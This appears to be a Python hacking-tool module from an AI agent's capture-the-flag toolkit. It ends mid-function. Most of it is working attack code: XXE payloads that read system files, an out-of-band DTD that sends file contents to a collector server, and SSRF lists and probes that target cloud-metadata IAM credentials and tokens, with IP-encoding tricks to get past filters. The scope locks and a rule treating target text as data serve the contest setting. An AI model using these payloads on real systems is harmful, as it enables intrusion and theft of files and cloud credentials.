#!/usr/bin/env python3
"""XXE, SSRF-to-cloud-metadata and GraphQL tooling: a HAND TOOL for the web agent against the squad's
single assigned live target. Nothing here auto-submits.

A web challenge may hand us a live app that parses attacker XML (XXE), fetches an
attacker-controlled URL server-side (SSRF), or exposes a GraphQL endpoint. This module gives the
agent the standard primitives for those three classes, each scope-locked and each confirmed
from the SERVER's own evidence, never from a reflection:

  (1) XXE    xxe_file_payloads() / xxe_oob_dtd() build the XML a parser reads (external general
             entity file read, php://filter base64 read, and the parameter-entity out-of-band
             exfil DTD/XML tools/oob.py serves); confirm_xxe_read() drives a web.py WebClient and
             claims a file read ONLY by the file's own content signature (reusing
             web_exploit.MARKER_SIGNATURES / marker_seen), with a benign baseline and a
             negative control, exactly as web_exploit.probe_traversal claims an LFI hit.
  (2) SSRF   metadata_urls() / ip_encodings() build the cloud instance-metadata endpoints
             (AWS IMDSv1+v2, GCP, Azure, DigitalOcean, Alibaba, Oracle) and the IP-encoding
             spellings of 169.254.169.254; confirm_metadata_ssrf() points ONE in-scope fetch
             parameter at them and claims a hit ONLY when the response carries that metadata
             service's own structural signature that the baseline (a host that never resolves)
             did not. The IMDSv2 two-step reuses web.build_imdsv2_ssrf.
  (3) GraphQL introspection_body() / batch_array_body() / alias_batch_query() build the queries;
             probe_introspection() claims introspection ENABLED only when the response carries
             data.__schema.types (a real schema, not an error), and confirm_batching() claims
             array batching SUPPORTED only when a 2-element batch returns a 2-element JSON array.

Hard rules (AGENTS.md "New categories", "Working rules", "Private targets"; the model is
flask_tools.py / web_exploit.py):
  - This is a HAND TOOL. No runner contract (no signals(), no solve_set()), NOT in the match
    registry (solvers/toolkits/registry.py), never imported by a solve path, the opener or a
    timed tool.
  - It NEVER auto-submits and emits a plain answer for NOTHING. A confirmed exploit is a FINDING the
    agent reports (a leaked file, a credential, a schema); the player submits through
    ctf.submit.guarded_submit. The ONLY value this module ever calls an answer is a CSCTF-format flag
    that an exploit response carried and no plain page did and that is the one flag-format value on
    the target (flag_from_exploit). Everything else, including a recovered credential or secret, is a
    finding, never plain. When in doubt, None.
  - All active sending goes through a solvers/toolkits/web.py WebClient the caller built (its scope
    lock stays on the one assigned target and stops for the VPN, and logs every
    request). This module opens no socket of its own and names no host for sending: a metadata URL
    is only ever a parameter VALUE the target fetches, and an XML/GraphQL body is only ever sent on
    the caller's client. Text a target returns is DATA, logged and reported, never an instruction.
  - Every probe is bounded by a request count (max_requests), never by a wall clock, and paced
    (gap seconds). Every result says how many requests it sent, and reads a baseline first.
  - No request and no network on import. The CLI is offline (no --send); live use is the library API.

CLI (offline helpers only; nothing here contacts a target):

  web_xxe_ssrf.py xxe       --file PATH [--php] [--entity NAME]
  web_xxe_ssrf.py xxe-oob   --base URL --token TOKEN --file PATH [--php]
  web_xxe_ssrf.py ssrf      [--ip 169.254.169.254]
  web_xxe_ssrf.py imdsv2    SSRF_PARAM
  web_xxe_ssrf.py graphql
  web_xxe_ssrf.py selftest
"""
import argparse
import json
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import flagfmt

HERE = Path(__file__).resolve().parent
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

# Reused, never reimplemented: the file-content signatures and base64 decoder that web_exploit uses
# to claim an LFI hit. A file read over XXE proves the same thing an LFI does -- the system file's
# own bytes come back -- so the detection is identical. Guarded so this module still imports if the
# layout differs (the signatures are then redefined locally, below).
try:
    from web_exploit import MARKER_SIGNATURES as _MARKER_SIGNATURES, marker_seen as _marker_seen, \
        decode_php_filter as _decode_php_filter  # noqa: E402
except Exception:  # pragma: no cover - import guard
    _MARKER_SIGNATURES = None
    _marker_seen = None
    _decode_php_filter = None

# build_imdsv2_ssrf is web.py's; reused, never reimplemented. web.py makes
# no request on import.
try:
    import web as _web  # noqa: E402
except Exception:  # pragma: no cover - import guard
    _web = None


class WebXXESSRFError(ValueError):
    """Raised when an offline payload-builder input is malformed or unsafe."""


_XML_NAME_RE = re.compile(r"[A-Za-z_:][A-Za-z0-9._:-]*")


def _xml_name(value, label):
    """Validate an XML Name for safe interpolation into a DTD/element, fail-closed."""
    if not isinstance(value, str) or not _XML_NAME_RE.fullmatch(value):
        raise WebXXESSRFError(f"{label} must be a valid XML name")
    return value


_SECURITY_JSON_MOD = None


def _security_json():
    """Load the solver's shared fail-closed policy parser without changing import paths."""
    global _SECURITY_JSON_MOD
    if _SECURITY_JSON_MOD is None:
        import importlib.util
        path = HERE.parent / "web" / "security_json.py"
        spec = importlib.util.spec_from_file_location("csctf_web_security_json_xxe", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        _SECURITY_JSON_MOD = mod
    return _SECURITY_JSON_MOD


def _json_text(body):
    raw = body.get("body") if isinstance(body, dict) and "body" in body else body
    if isinstance(raw, (bytes, bytearray)):
        try:
            return bytes(raw).decode("utf-8", "strict")
        except UnicodeDecodeError:
            return None
    return raw if isinstance(raw, str) else None


def _looks_structural_json(body):
    raw = body.get("body") if isinstance(body, dict) and "body" in body else body
    if isinstance(raw, (bytes, bytearray)):
        data = bytes(raw)
        if data.startswith(b"\xef\xbb\xbf"):
            data = data[3:]
        # Keep malformed UTF-8 JSON in the strict-JSON lane.  Otherwise a
        # target can append an invalid byte and make callers reinterpret the
        # same structural document as permissive raw text.
        return data.lstrip(b" \t\r\n")[:1] in (b"{", b"[")
    text = _json_text(body)
    return bool(text is not None and text.lstrip("\ufeff \t\r\n")[:1] in ("{", "["))


def _strict_json(body):
    """Bounded JSON that rejects duplicates and case/punctuation/camel key collisions."""
    text = _json_text(body)
    if text is None:
        return None
    try:
        return _security_json().loads(text, max_chars=1_048_576)
    except Exception:
        return None


# =====================================================================================
#  The flag form and the never-a-guess rule
# =====================================================================================

# The CSCTF flag format. A recovered flag is RETURNED for the player to submit through
# ctf.submit.guarded_submit; nothing here auto-submits. Defined locally so this hand tool does not
# import a solver.
FLAG_RE = flagfmt.TEXT


def _text(body):
    if isinstance(body, (bytes, bytearray)):
        return bytes(body).decode("utf-8", "replace")
    if isinstance(body, dict) and "body" in body:
        return _text(body["body"])
    return str(body or "")


def is_flag(value):
    """True when ``value`` is exactly one CSCTF-format flag (the returnable form)."""
    return isinstance(value, str) and bool(FLAG_RE.fullmatch(value))


def flags_seen(*bodies):
    """Every distinct CSCTF-format flag string seen across the bodies, preserving its spelling."""
    out = set()
    for b in bodies:
        for m in FLAG_RE.findall(_text(b)):
            out.add(m)
    return out


def flag_from_exploit(exploit_body, baseline_bodies=()):
    """The single flag this exploit response carries and no baseline/plain page does, else None.

    The never-a-guess rule:
      - it matches the CSCTF flag format exactly (is_flag);
      - it is the ONLY flag-format value seen anywhere across the exploit response AND every
        baseline/plain body given (one-flag rule);
      - it is in the exploit response and in NO baseline/plain body (payoff-not-plain).
    Anything else is None: a reported finding, never a submitted answer. `baseline_bodies` is the
    plain pages (the landing page, the response with no payload); pass them so a flag the site shows
    everywhere is not claimed."""
    exploit = _text(exploit_body)
    baselines = [_text(b) for b in (baseline_bodies or ())]
    everywhere = flags_seen(exploit, *baselines)
    if len(everywhere) != 1:
        return None
    value = next(iter(everywhere))
    if not is_flag(value):
        return None
    # payoff-not-plain: must be in the exploit body and in no baseline/plain body.
    exploit_hits = set(FLAG_RE.findall(exploit))
    if value not in exploit_hits:
        return None
    for b in baselines:
        if value in set(FLAG_RE.findall(b)):
            return None
    return value


# -------------------------------------------------------------------------------------
# The Huntress proof spec, a registered format carried beside the CSCTF flag spec.
#
# Some targets (the wave125/Days-1..5 web lane) judge a `proof_<32 hex>` token rather than
# a CSCTF-format flag. These three regexes MUST stay byte-for-byte equal to
# solvers/web/proof_hunt.py's; tests/test_wave125_web_xxe_ssrf.py imports proof_hunt and
# asserts they do, so they can never drift. Defined locally so this hand tool does not
# import a solver. The broad-seen / strict-return split is deliberate: proofs_seen keeps
# every case so the agent sees the evidence; is_proof is the strict lowercase auto-return
# gate, so an uppercase candidate is never silently normalized into a returnable answer.
PROOF_SEEN = flagfmt.PROOF_ANYCASE
PROOF_FORMAT = flagfmt.Filtered(flagfmt.PROOF_TEXT, lambda t: _uuid4_token(t), "uuid4")


def _uuid4_token(token: str) -> bool:
    """The token's 32 hex digits form a version-4 RFC 4122 UUID (an observed validator, never a gate)."""
    hexpart = token.rsplit("_", 1)[-1]
    return len(hexpart) == 32 and hexpart[12] == "4" and hexpart[16] in "89ab"


PROOF_WIRE = flagfmt.PROOF_TEXT


def is_proof(value):
    """High-confidence lowercase proof_32hex wire form, as proof_hunt.is_proof.

    PROOF_FORMAT retains the empirical UUID-v4 validator for diagnostics, but
    exact_text never made those two nibbles part of the contract.
    """
    return isinstance(value, str) and bool(PROOF_WIRE.fullmatch(value))


def proofs_seen(*bodies):
    """Every distinct proof-like token (proof_ + 32 hex, any case), preserving its wire spelling.

    Case is evidence, not presentation: an uppercase/mixed-case candidate may be useful to the
    agent, but lowercasing it would manufacture a value that the target never returned and could
    turn it into an auto-returnable lowercase proof.  Keep the exact token here; ``is_proof`` is
    the separate, strict lowercase auto-return gate.
    """
    out = set()
    for b in bodies:
        for m in PROOF_SEEN.findall(_text(b)):
            out.add(m)
    return out


def proof_from_exploit(exploit_body, baseline_bodies=()):
    """The single judged proof this exploit response carries and no baseline/plain page does, else None.

    The never-guess rule, exactly as solvers/web/proof_hunt.py applies it:
      - it has the high-confidence lowercase proof_32hex wire form (is_proof);
      - it is the ONLY proof-like value (proof_ + 32 hex, any case) seen anywhere across the exploit
        response AND every baseline/plain body given (one-proof rule);
      - it is in the exploit response and in NO baseline/plain body (payoff-not-plain).
    Anything else is None: a reported finding, never a submitted answer. `baseline_bodies` is the
    plain pages (the landing page, the response with no payload); pass them so a proof the site shows
    everywhere is not claimed."""
    exploit = _text(exploit_body)
    baselines = [_text(b) for b in (baseline_bodies or ())]
    everywhere = proofs_seen(exploit, *baselines)
    if len(everywhere) != 1:
        return None
    value = next(iter(everywhere))
    if not is_proof(value):
        return None
    # payoff-not-plain: must be in the exploit body and in no baseline/plain body.
    exploit_hits = set(PROOF_SEEN.findall(exploit))
    if value not in exploit_hits:
        return None
    for b in baselines:
        if value in set(PROOF_SEEN.findall(b)):
            return None
    return value


# =====================================================================================
#  (1) XXE -- payload builders (strings only) and a confirmed file-read probe
# =====================================================================================

# The system files whose own content signatures confirm a read; reused from web_exploit when present.
if _MARKER_SIGNATURES is not None:
    MARKER_SIGNATURES = dict(_MARKER_SIGNATURES)
else:  # pragma: no cover - only when web_exploit is unavailable
    MARKER_SIGNATURES = {
        "/etc/passwd": re.compile(rb"(?<![A-Za-z0-9_.-])root:[^:\n<]{0,64}:0:0:[^\n]{0,256}:/"),
        "C:\\Windows\\win.ini": re.compile(rb"(?is)\[fonts\].{0,200}\[extensions\]"),
    }
XXE_MARKER_FILES = ("/etc/passwd", "C:\\Windows\\win.ini")


def _file_system_id(target_file, php=False):
    """The SYSTEM identifier for an external entity reading `target_file`: a php://filter base64 read
    (php=True, so binary/PHP source survives XML parsing), an already-qualified URL as given, or a
    file:// URL. The file is a path, never attacker text, so it is placed verbatim."""
    f = str(target_file or "")
    if php:
        return "php://filter/convert.base64-encode/resource=" + f
    if "://" in f:
        return f
    return "file://" + (f if f.startswith("/") else "/" + f)


def xxe_file_payload(target_file, *, entity="xxe", root="data", php=False):
    """One classic in-band XXE document: a DOCTYPE declaring an external general entity that reads
    `target_file`, and a root element that prints it. The response echoes the entity's expansion,
    which is the file's bytes. A payload STRING only; the agent sends it on its WebClient."""
    _xml_name(entity, "entity")
    _xml_name(root, "root")
    sysid = _file_system_id(target_file, php=php)
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "{sysid}">]>\n'
            f'<{root}>&{entity};</{root}>')


def xxe_file_payloads(target_file, *, entity="xxe", root="data"):
    """Labelled in-band XXE variants for reading one file, in a useful order: the file:// read, the
    php://filter base64 read (PHP source / binary), and a UTF-16 document (an app that only parses
    UTF-16). A list of (label, xml). Strings only; a hit is confirmed by the file's content signature,
    never by which label was sent. (The parameter-entity read is NOT an in-band variant: a parameter
    entity in the INTERNAL subset is restricted by XML, which is why that technique uses an external
    DTD -- xxe_oob_dtd, the out-of-band path.)"""
    plain = xxe_file_payload(target_file, entity=entity, root=root, php=False)
    php = xxe_file_payload(target_file, entity=entity, root=root, php=True)
    utf16_text = ('<?xml version="1.0" encoding="UTF-16"?>\n'
                  f'<!DOCTYPE {root} [<!ENTITY {entity} SYSTEM "{_file_system_id(target_file)}">]>\n'
                  f'<{root}>&{entity};</{root}>')
    # Encode to actual UTF-16 bytes (with a BOM) so the document's bytes match
    # its UTF-16 encoding declaration; a str here would be UTF-8 bytes.
    utf16 = utf16_text.encode("utf-16")
    return [("file_url", plain), ("php_filter", php), ("utf16", utf16)]


def xxe_oob_dtd(collector_base, token, target_file, *, php=False):
    """(DTD text, XML payload) for an OUT-OF-BAND XXE read: the parameter-entity exfil DTD and the
    short XML that loads it. The file's bytes come back to the collector as a query parameter, so a
    blind parser (no entity echo in the response) still leaks the file. This is the exact shape
    tools/oob.py's `dtd` subcommand serves; serve and COLLECT with it:

        oob.py up                       # start the collector bound to the VPN tunnel
        oob.py dtd <token> <file>       # writes/serves the DTD, prints this same XML
        oob.py hits --token <token>     # the file comes back in the hit's d= parameter

    `collector_base` is the http base the target can reach (oob.py's tunnel/public URL); nothing is
    sent here -- strings only."""
    base = str(collector_base).rstrip("/")
    sysid = _file_system_id(target_file, php=php)
    exfil = f"{base}/{token}/xxe?d=%file;"
    dtd = (f'<!ENTITY % file SYSTEM "{sysid}">\n'
           f"<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '{exfil}'>\">\n"
           "%eval;\n%exfil;\n")
    payload = ('<?xml version="1.0"?>\n'
               f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{base}/f/{token}.dtd"> %ext;]>\n'
               "<r>1</r>")
    return dtd, payload


def _xxe_sender(client, path, *, method="POST", content_type="application/xml", param=None,
                headers=None, send=None):
    """A `send(xml) -> response` for the confirm functions. When `send` is given it is used as is (the
    agent wired the exact injection point -- a SOAP action, an SVG upload, a DOCX part). Otherwise a
    request is built on the caller's WebClient: the XML as the raw body with `content_type`, or
    form-encoded under `param`."""
    if send is not None:
        return send
    extra = dict(headers or {})

    def _send(xml):
        if param is None:
            h = {"Content-Type": content_type}
            h.update(extra)
            return client.request(method, path, data=xml, headers=h)
        body = urllib.parse.urlencode({param: xml})
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        h.update(extra)
        return client.request(method, path, data=body, headers=h)

    return _send


def _absent_beside(marker_file):
    """A file that does not exist beside the marker, for the negative control (web_exploit's rule)."""
    import os
    d = marker_file.replace("\\", "/").rsplit("/", 1)[0] or "/"
    return (d.rstrip("/") + "/csctf_absent_" + os.urandom(4).hex() + ".nope")


def confirm_xxe_read(client=None, path=None, *, marker_files=XXE_MARKER_FILES, method="POST",
                     content_type="application/xml", param=None, headers=None, send=None,
                     entity="xxe", root="data", max_requests=40, gap=0.05):
    """Confirm an in-band XXE file read on the target and report HOW, from the file's own content
    signature only. Returns:

        {"found": bool, "marker": "/etc/passwd"|..., "variant": "file_url"|"php_filter"|...,
         "how": "raw"|"base64", "status": int, "payload": xml, "control_clean": bool,
         "baseline_has": [markers already on the no-entity baseline], "requests": n, "tried": [...]}

    A hit is claimed ONLY when (a) a benign no-entity baseline does NOT already carry the marker's
    signature, (b) a file-read variant's response DOES (raw, or inside a base64 run for php://filter
    -- marker_seen), and (c) the negative control (the same variant reading a file that does not
    exist beside the marker) does NOT -- so a page that echoes any <...>SYSTEM input is not a hit.
    Mirrors web_exploit.probe_traversal. `send` or `client`+`path` supplies the transport; this
    function sends nothing of its own. Bounded by max_requests (baseline + controls count)."""
    if _marker_seen is None:   # pragma: no cover
        raise RuntimeError("web_exploit.marker_seen is unavailable; cannot confirm an XXE read safely")
    sender = _xxe_sender(client, path, method=method, content_type=content_type, param=param,
                         headers=headers, send=send)
    sent = [0]

    def shoot(xml):
        if sent[0] and gap:
            time.sleep(gap)
        sent[0] += 1
        return sender(xml)

    sigs = {m: MARKER_SIGNATURES[m] for m in marker_files if m in MARKER_SIGNATURES}
    # Baseline: a well-formed document with no external entity. Any marker it already shows is the
    # target's own content, never claimed.
    baseline = shoot(f'<?xml version="1.0"?>\n<{root}>csctf-baseline</{root}>')
    baseline_has = [m for m, sig in sigs.items() if _marker_seen(sig, baseline.get("body"))]
    tried = []
    for marker, sig in sigs.items():
        if marker in baseline_has:
            continue
        for label, xml in xxe_file_payloads(marker, entity=entity, root=root):
            if sent[0] >= max_requests:
                break
            r = shoot(xml)
            how = _marker_seen(sig, r.get("body"))
            tried.append((marker, label, r.get("status"), how))
            if not how:
                continue
            # Negative control: the same variant reading an absent file beside the marker must not
            # show the signature, or the page shows it for any SYSTEM input (a decoy).
            if sent[0] >= max_requests:
                break
            absent = _absent_beside(marker)
            ctrl_xml = dict(xxe_file_payloads(absent, entity=entity, root=root)).get(label)
            ctrl = shoot(ctrl_xml)
            control_clean = not _marker_seen(sig, ctrl.get("body"))
            if control_clean:
                return {"found": True, "marker": marker, "variant": label, "how": how,
                        "status": r.get("status"), "payload": xml, "control_clean": True,
                        "baseline_has": baseline_has, "requests": sent[0], "tried": tried}
            tried.append((absent, label + "/control", ctrl.get("status"), "decoy"))
    return {"found": False, "marker": None, "variant": None, "how": None, "status": None,
            "payload": None, "control_clean": None, "baseline_has": baseline_has,
            "requests": sent[0], "tried": tried}


def read_file_over_xxe(client=None, path=None, target_file="/flag.txt", *,
                       variant="file_url", method="POST", content_type="application/xml", param=None,
                       headers=None, send=None, entity="xxe", root="data", baseline_bodies=()):
    """Once confirm_xxe_read says a variant works, read one more file with the SAME variant and return
    {"body", "decoded", "flag", "proof", "status"}. `decoded` is the base64-decoded bytes for the
    php_filter variant (else None). `flag` is the single CSCTF-format flag the response carries and no
    plain page does (flag_from_exploit); `proof` is the single judged proof_<32hex> under the same
    rule (proof_from_exploit) -- the ONLY things the agent may submit; the file's bytes are a finding.
    One request."""
    sender = _xxe_sender(client, path, method=method, content_type=content_type, param=param,
                         headers=headers, send=send)
    payloads = dict(xxe_file_payloads(target_file, entity=entity, root=root))
    xml = payloads.get(variant) or xxe_file_payload(target_file, entity=entity, root=root,
                                                     php=(variant == "php_filter"))
    r = sender(xml)
    body = r.get("body")
    decoded = None
    if variant == "php_filter" and _decode_php_filter is not None:
        decoded = _decode_php_filter(body)
    # The file's bytes may arrive base64-encoded (php://filter); scan the decoded content too so a
    # flag inside a PHP/binary file is still read. The decoded text joins the exploit body for the
    # one-flag / payoff-not-plain rule.
    scan = _text(body) + (("\n" + _text(decoded)) if decoded else "")
    return {"body": body, "decoded": decoded, "status": r.get("status"),
            "flag": flag_from_exploit(scan, baseline_bodies),
            "proof": proof_from_exploit(scan, baseline_bodies)}


# =====================================================================================
#  (2) SSRF to cloud instance metadata (169.254.169.254) -- catalog, encodings, confirmed probe
# =====================================================================================

METADATA_IP = "169.254.169.254"
ALIBABA_IP = "100.100.100.100"

# Per cloud: the read endpoints and the INNER request header the metadata service requires. The app
# makes the inner request, so a header is reachable only if the app forwards it (note it for the
# agent); headerless clouds (AWS IMDSv1, DigitalOcean, Alibaba) leak over a plain fetch parameter.
METADATA_ENDPOINTS = {
    "aws_imdsv1": {
        "urls": [
            f"http://{METADATA_IP}/latest/meta-data/",
            f"http://{METADATA_IP}/latest/meta-data/iam/security-credentials/",
            f"http://{METADATA_IP}/latest/dynamic/instance-identity/document",
            f"http://{METADATA_IP}/latest/user-data",
        ],
        "headers": {},
        "note": "AWS IMDSv1: no header needed; list roles at /iam/security-credentials/ then GET /<role>",
    },
    "gcp": {
        "urls": [
            f"http://{METADATA_IP}/computeMetadata/v1/instance/service-accounts/default/token",
            f"http://{METADATA_IP}/computeMetadata/v1/?recursive=true",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "headers": {"Metadata-Flavor": "Google"},
        "note": "GCP: requires the Metadata-Flavor: Google header on the INNER request (reachable only "
                "if the app forwards headers); a headerless 403 naming Metadata-Flavor still confirms reach",
    },
    "azure": {
        "urls": [
            f"http://{METADATA_IP}/metadata/instance?api-version=2021-02-01",
            f"http://{METADATA_IP}/metadata/identity/oauth2/token?api-version=2018-02-01"
            "&resource=https://management.azure.com/",
        ],
        "headers": {"Metadata": "true"},
        "note": "Azure IMDS: requires the Metadata: true header on the INNER request; a 400 requiring "
                "that header still confirms reach",
    },
    "digitalocean": {
        "urls": [f"http://{METADATA_IP}/metadata/v1.json", f"http://{METADATA_IP}/metadata/v1/"],
        "headers": {},
        "note": "DigitalOcean: no header needed",
    },
    "alibaba": {
        "urls": [f"http://{ALIBABA_IP}/latest/meta-data/",
                 f"http://{ALIBABA_IP}/latest/meta-data/ram/security-credentials/"],
        "headers": {},
        "note": "Alibaba Cloud: metadata at 100.100.100.100, no header needed",
    },
    "oracle": {
        "urls": [f"http://{METADATA_IP}/opc/v2/instance/",
                 f"http://{METADATA_IP}/opc/v2/instance/metadata/"],
        "headers": {"Authorization": "Bearer Oracle"},
        "note": "Oracle OCI: IMDSv2 wants Authorization: Bearer Oracle on the inner request",
    },
}

# Structural signatures of each metadata service's RESPONSE. A reflection of the URL never matches
# these; only the service's own bytes do. aws_credentials is the money shot (temporary IAM creds).
_META_SIG = {
    "aws_credentials": re.compile(
        rb'(?s)"Code"\s*:\s*"Success".*"AccessKeyId".*"SecretAccessKey".*"Token"'),
    "aws_identity_doc": re.compile(rb'(?s)"accountId".*"instanceId".*"region"'),
    # AWS-unique IMDS leaf names only (instance-id/instance-type/local-ipv4 are shared with Alibaba IMDS
    # and would collide): ami-id, iam/, security-groups, instance-action, reservation-id, public-keys/.
    "aws_imds_listing": re.compile(rb"(?m)^(?:ami-id|ami-launch-index|iam/|instance-action|"
                                   rb"reservation-id|security-groups|public-keys/)\b"),
    "gcp_json": re.compile(rb'(?s)"(?:serviceAccounts|machineType|numericProjectId)"\s*:'),
    "gcp_token": re.compile(rb'(?s)"access_token"\s*:.*"token_type"\s*:\s*"Bearer"'),
    "gcp_reachable_403": re.compile(rb"(?i)Metadata-Flavor"),
    "azure_json": re.compile(rb'(?s)"(?:azEnvironment|vmId|resourceGroupName)"\s*:'),
    "azure_reachable": re.compile(rb"(?i)Required metadata header not specified|Metadata:\s*true"),
    "digitalocean_json": re.compile(rb'(?s)"(?:droplet_id|dropletId)"\s*:'),
    # Alibaba-unique IMDS leaf names only (image-id, ram/, region-id, zone-id, owner-account-id).
    "alibaba_listing": re.compile(rb"(?m)^(?:image-id|ram/|region-id|zone-id|owner-account-id)\b"),
    "oracle_json": re.compile(rb'(?s)"(?:ociAdName|canonicalRegionName|compartmentId)"\s*:'),
}
# A signature -> the cloud it confirms reached (the money-shot ones imply the cloud too).
_SIG_CLOUD = {
    "aws_credentials": "aws", "aws_identity_doc": "aws", "aws_imds_listing": "aws",
    "gcp_json": "gcp", "gcp_token": "gcp", "gcp_reachable_403": "gcp",
    "azure_json": "azure", "azure_reachable": "azure",
    "digitalocean_json": "digitalocean", "alibaba_listing": "alibaba", "oracle_json": "oracle",
}


def ip_encodings(ip=METADATA_IP):
    """Alternate spellings of a dotted-quad IPv4 that many URL parsers resolve to the same host, to
    beat a naive 169.254.169.254 string filter. Computed from the octets (never hard-coded), so it is
    correct for any `ip`. A list of strings (the host part only)."""
    try:
        parts = [int(x) for x in str(ip).split(".")]
    except (TypeError, ValueError) as exc:
        raise WebXXESSRFError(f"not a dotted-quad IPv4: {ip!r}") from exc
    if len(parts) != 4 or any(not 0 <= p <= 255 for p in parts):
        raise WebXXESSRFError(f"not a dotted-quad IPv4: {ip!r}")
    n = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]
    dec = str(n)
    hexfull = "0x%08x" % n
    octets_oct = ".".join("0%o" % p for p in parts)                 # 0251.0376.0251.0376
    hex_octets = ".".join("0x%02x" % p for p in parts)              # 0xa9.0xfe.0xa9.0xfe
    # two-part dotted (host.host16): last two octets fused
    two_part = f"{parts[0]}.{parts[1]}.{(parts[2] << 8) | parts[3]}"
    ipv6_mapped = f"[::ffff:{ip}]"
    ipv6_hex = "[::ffff:%02x%02x:%02x%02x]" % tuple(parts)
    return [ip, dec, hexfull, octets_oct, hex_octets, two_part, ipv6_mapped, ipv6_hex]


def metadata_urls(ip=METADATA_IP, *, encodings=False):
    """Every cloud-metadata URL to try, as (cloud, url, inner_headers, note). With encodings=True the
    headerless AWS IMDSv1 reads are repeated under each IP spelling of `ip` (ip_encodings). Strings
    only; the agent feeds each url as the fetch parameter's VALUE through confirm_metadata_ssrf."""
    out = []
    for cloud, spec in METADATA_ENDPOINTS.items():
        for u in spec["urls"]:
            out.append((cloud, u, dict(spec["headers"]), spec["note"]))
    if encodings:
        # The metadata ROOT returns a recognizable listing; the encoded spellings are to REACH the
        # service past a naive 169.254.169.254 string filter, so point them where a signature shows.
        tmpl = f"http://{ip}/latest/meta-data/"
        for host in ip_encodings(ip)[1:]:   # the dotted form is already above
            out.append(("aws_imdsv1_enc", tmpl.replace(ip, host, 1), {},
                        f"AWS IMDSv1 with the host spelled {host}"))
    return out


def imdsv2_steps(ssrf_param, metadata_path="/latest/meta-data/iam/security-credentials/"):
    """The AWS IMDSv2 two-step (PUT token, then GET with the token) as exploit artifacts, for an app
    whose fetch forwards the method and headers. Delegates to web.build_imdsv2_ssrf (reused, never
    reimplemented). Returns [step1, step2] dicts; nothing is sent here."""
    if _web is None or not hasattr(_web, "build_imdsv2_ssrf"):   # pragma: no cover
        raise RuntimeError("solvers/toolkits/web.py build_imdsv2_ssrf is unavailable")
    return _web.build_imdsv2_ssrf(ssrf_param, metadata_path)


def metadata_signature(body):
    """Which metadata service's RESPONSE this body is, by its own structure, or None. Returns
    (cloud, [signature names that matched]); a URL reflection or an arbitrary page matches nothing."""
    # JSON metadata is policy-bearing evidence. Never let a duplicate/colliding document be
    # interpreted by regex after the strict parser has refused it. Plain IMDS listings and error
    # banners remain intentionally supported.
    if _looks_structural_json(body) and _strict_json(body) is None:
        return None
    data = body if isinstance(body, (bytes, bytearray)) else _text(body).encode("utf-8", "replace")
    matched = [name for name, sig in _META_SIG.items() if sig.search(data)]
    if not matched:
        return None
    clouds = {_SIG_CLOUD[m] for m in matched}
    cloud = next(iter(clouds)) if len(clouds) == 1 else "+".join(sorted(clouds))
    return cloud, matched


def parse_aws_credentials(body):
    """The temporary IAM credentials dict (AccessKeyId, SecretAccessKey, Token, Expiration) when the
    body is an AWS IMDS credentials document, else None. A FINDING for the agent to report, NEVER an
    answer and never used/tested by this tool."""
    obj = _strict_json(body)
    if not isinstance(obj, dict):
        return None
    if {"AccessKeyId", "SecretAccessKey"} <= set(obj):
        return {k: obj.get(k) for k in ("AccessKeyId", "SecretAccessKey", "Token", "Expiration",
                                        "Code", "Type") if k in obj}
    return None


_SSRF_BASELINE = "http://ssrf-metadata-baseline.invalid/"   # .invalid never resolves (RFC 2606)


def confirm_metadata_ssrf(client, path, param, *, urls=None, method="GET", extra=None,
                          encodings=True, ip=METADATA_IP, max_requests=24, gap=0.0):
    """Point ONE in-scope fetch parameter at the cloud-metadata endpoints and confirm a hit from the
    metadata service's own structural signature. Returns:

        {"hit": bool, "cloud": str, "url": str, "matched": [sig names], "status": int, "body": ...,
         "credentials": {...}|None, "flag": flag|None, "proof": proof|None, "baseline_status": int,
         "requests": n, "tried": [(cloud, url, status, matched)]}

    `client` is the caller's WebClient: every request goes to the TARGET only (its scope lock, VPN
    stop and log); the metadata URL is a parameter VALUE the target fetches, never a request from
    here. A baseline (a host that never resolves) goes first; a response is a hit ONLY when it
    carries a metadata signature (metadata_signature) the baseline did NOT. The URL the app echoes is
    never trusted. `credentials` is a parsed AWS creds document if present (a finding). `flag` is the
    single flag the winning body carries and the baseline did not (flag_from_exploit); `proof` is the
    single judged proof under the same rule (proof_from_exploit) -- the only submittable values; a
    credential is a finding, never plain. method "POST" form-encodes the
    parameter. Bounded by max_requests (baseline counts), paced by gap."""
    targets = urls if urls is not None else metadata_urls(ip, encodings=encodings)
    sent = [0]

    def send(value):
        fields = dict(extra or {})
        fields[param] = value
        enc = urllib.parse.urlencode(fields)
        if sent[0] and gap:
            time.sleep(gap)
        sent[0] += 1
        if method.upper() == "GET":
            return client.request("GET", path + ("&" if "?" in path else "?") + enc)
        return client.request(method.upper(), path, data=enc,
                              headers={"Content-Type": "application/x-www-form-urlencoded"})

    base = send(_SSRF_BASELINE)
    base_matched = metadata_signature(base.get("body"))
    base_sigs = set(base_matched[1]) if base_matched else set()
    tried = []
    for item in targets:
        if sent[0] >= max_requests:
            break
        cloud = item[0] if isinstance(item, (tuple, list)) else "?"
        url = item[1] if isinstance(item, (tuple, list)) else str(item)
        r = send(url)
        sig = metadata_signature(r.get("body"))
        new = [s for s in (sig[1] if sig else []) if s not in base_sigs]
        tried.append((cloud, url, r.get("status"), new))
        if new:
            body = r.get("body")
            return {"hit": True, "cloud": (sig[0] if sig else cloud), "url": url, "matched": new,
                    "status": r.get("status"), "body": body,
                    "credentials": parse_aws_credentials(body),
                    "flag": flag_from_exploit(body, [base.get("body")]),
                    "proof": proof_from_exploit(body, [base.get("body")]),
                    "baseline_status": base.get("status"), "requests": sent[0], "tried": tried}
    return {"hit": False, "cloud": None, "url": None, "matched": [], "status": None, "body": None,
            "credentials": None, "flag": None, "proof": None, "baseline_status": base.get("status"),
